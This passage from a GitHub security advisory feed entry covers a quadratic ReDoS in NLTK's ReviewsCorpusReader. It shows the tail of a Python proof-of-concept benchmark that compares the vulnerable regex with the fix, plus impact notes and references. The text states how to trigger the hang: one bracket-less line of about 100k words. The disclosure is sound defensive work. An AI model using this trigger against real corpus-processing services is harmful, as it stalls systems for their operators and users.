    print(f"  identical: {a == b}")
    return a == b


def main():
    print("=" * 66)
    print(" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)")
    print("=" * 66)
    print(f" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}")

    bench("VULNERABLE  reviews.py L70-71", FEATURES_VULN)
    bench("BOUNDED     fix #3583", FEATURES_FIXED)
    same = parity_check()

    print("\n" + "=" * 66)
    print(" Vulnerable: ~4x time per input doubling  =&gt; O(n^2) quadratic ReDoS")
    print(" Bounded:    ~2x time per input doubling  =&gt; O(n)   linear, stays in ms")
    print(f" Extraction parity on real annotations preserved: {same}")
    print(" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().")
    print("=" * 66)


if __name__ == "__main__":
    main()
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service. Processing a single crafted line through <code>ReviewsCorpusReader</code> consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897">https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897</a></li>
<li><a href="https://github.com/advisories/GHSA-fg7f-2386-8897">https://github.com/advisories/GHSA-fg7f-2386-8897</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg7f-2386-8897</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-31T16:51:09.000Z</published>
    </entry>
</feed>